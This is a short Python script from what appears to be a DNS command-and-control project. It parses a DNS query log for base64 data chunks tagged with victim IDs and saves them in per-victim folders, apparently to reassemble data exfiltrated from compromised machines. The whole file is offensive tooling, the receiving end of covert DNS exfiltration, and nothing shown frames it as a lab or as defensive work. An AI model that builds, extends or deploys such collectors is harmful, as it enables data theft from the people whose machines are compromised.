import os
import re
import logging
from pathlib import Path

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

# === 프로젝트 루트 기준으로 경로 계산 ===
SCRIPT_DIR = Path(__file__).resolve().parent          # e.g. analyzer/
PROJECT_ROOT = SCRIPT_DIR.parent                       # dns-c2/
LOG_FILE = PROJECT_ROOT / "logs" / "raw" / "dns_query.log"
RESULTS_DIR = PROJECT_ROOT / "logs" / "results"

# Regex to match CHUNK lines
CHUNK_PATTERN = re.compile(r"CHUNK:(\d{4}) \| VICTIM:([0-9a-f-]{36}) \| B64:([a-zA-Z0-9_-]+)")

def extract_chunks():
    # Ensure results directory exists
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    # Read DNS query log
    try:
        with LOG_FILE.open("r") as f:
            lines = f.readlines()
    except Exception as e:
        logging.error(f"Failed to read log file {LOG_FILE}: {e}")
        return

    processed_chunks = set()
    for line in lines:
        match = CHUNK_PATTERN.search(line)
        if not match:
            continue

        idx, victim_id, b64_chunk = match.groups()
        key = (idx, victim_id)
        if key in processed_chunks:
            continue

        victim_dir = RESULTS_DIR / victim_id
        victim_dir.mkdir(exist_ok=True)

        chunk_file = victim_dir / f"chunk{idx}.b64"
        try:
            with chunk_file.open("w") as cf:
                cf.write(b64_chunk)
            logging.info(f"Saved chunk {idx} for victim {victim_id} to {chunk_file}")
            processed_chunks.add(key)
        except Exception as e:
            logging.error(f"Failed to save chunk {idx} for victim {victim_id}: {e}")

if __name__ == "__main__":
    logging.info("Starting chunk extraction")
    extract_chunks()
    logging.info("Chunk extraction completed")
